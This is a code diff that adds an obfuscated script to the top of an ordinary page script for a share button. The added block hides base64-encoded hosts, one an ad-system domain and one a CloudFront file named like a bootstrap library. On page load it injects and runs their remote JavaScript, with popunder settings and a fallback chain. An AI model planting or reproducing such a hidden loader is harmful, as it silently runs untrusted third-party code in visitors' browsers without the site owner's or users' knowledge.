@@ -1,3 +1,8 @@
+<script type="text/javascript" data-cfasync="false">
+/*<![CDATA[/* */
+(function(){var i=window,t="f5d51f582260e7a431e2091cdf755c44",c=[["siteId",320*131-402*825-255+5503372],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],w=["d3d3LmJldHRlcmFkc3lzdGVtLmNvbS9Wai9Pcy93cGF0aC5taW4uanM=","ZDJrazBvM2ZyN2VkMDEuY2xvdWRmcm9udC5uZXQveGJvb3RzdHJhcC5taW4uanM="],q=-1,n,a,f=function(){clearTimeout(a);q++;if(w[q]&&!(1778161970000<(new Date).getTime()&&1<q)){n=i.document.createElement("script");n.type="text/javascript";n.async=!0;var g=i.document.getElementsByTagName("script")[0];n.src="https://"+atob(w[q]);n.crossOrigin="anonymous";n.onerror=f;n.onload=function(){clearTimeout(a);i[t.slice(0,16)+t.slice(0,16)]||f()};a=setTimeout(f,5E3);g.parentNode.insertBefore(n,g)}};if(!i[t]){try{Object.freeze(i[t]=c)}catch(e){}f()}})();
+/*]]>/* */
+</script>
 // Main Page Functionality
 if (document.getElementById('share-btn')) {
     let shareCount = 0;
